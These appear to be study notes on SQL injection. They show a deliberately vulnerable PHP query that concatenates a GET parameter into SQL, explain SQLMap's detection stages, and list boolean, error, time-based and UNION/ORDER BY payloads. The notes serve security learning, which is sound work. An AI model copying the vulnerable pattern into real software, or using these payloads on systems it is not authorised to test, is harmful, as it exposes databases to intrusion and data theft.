# Vulnerable PHP Code

```php
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0,1";
```

## Why Vulnerable?

User input:

```text
?id=1
```

is directly concatenated into SQL query without sanitization/filtering.

Example:

```text
?id=1 OR 1=1
```

can modify the query logic.

---

# SQLMap Detection Process

## 1. Connection Test

```text
testing connection to the target URL
```

Checks:

- target reachable
    
- webpage accessible
    

---

## 2. Stability Check

```text
target URL content is stable
```

Checks whether page responses change randomly.

Needed for:

- blind SQLi detection
    

---

## 3. Dynamic Parameter Detection

```text
GET parameter 'id' appears to be dynamic
```

Means:

- changing parameter changes response
    
- parameter likely used in SQL query
    

---

## 4. Heuristic SQLi Test

```text
parameter 'id' might be injectable
```

Initial quick SQLi checks.

---

## 5. XSS Test

```text
parameter 'id' might be vulnerable to XSS
```

SQLMap also checks possible XSS reflection.

# SQL Injection Types Detected

---

# Boolean-Based Blind SQLi

```text
AND boolean-based blind
```

Payload:

```sql
id=1 AND 8814=8814
```

TRUE condition:

- normal response
    

FALSE condition:

- different response
    

SQLMap compares responses to detect SQLi.

---

# Error-Based SQLi

```text
error-based injectable
```

Payload:

```sql
FLOOR(RAND(0)*2)
```

Purpose:

- intentionally trigger MySQL error
    
- leak information through error messages
    

---

# Time-Based Blind SQLi

```text
SLEEP(5)
```

Payload:

```sql
id=1 AND (SELECT(SLEEP(5)))
```

If response delays:

- parameter injectable
    

---

# UNION-Based SQLi

```text
UNION query injectable
```

Payload:

```sql
UNION ALL SELECT NULL,NULL,NULL
```

Purpose:

- determine number of columns
    
- display injected output in webpage
    

---

# ORDER BY Technique

```text
ORDER BY technique appears to be usable
```

SQLMap uses:

```sql
ORDER BY 1
ORDER BY 2
ORDER BY 3
```

to determine:

- correct column count
    

---

# Column Count Detection

```text
target URL appears to have 3 columns
```

Important for UNION-based SQLi because:

- injected query must match original column count
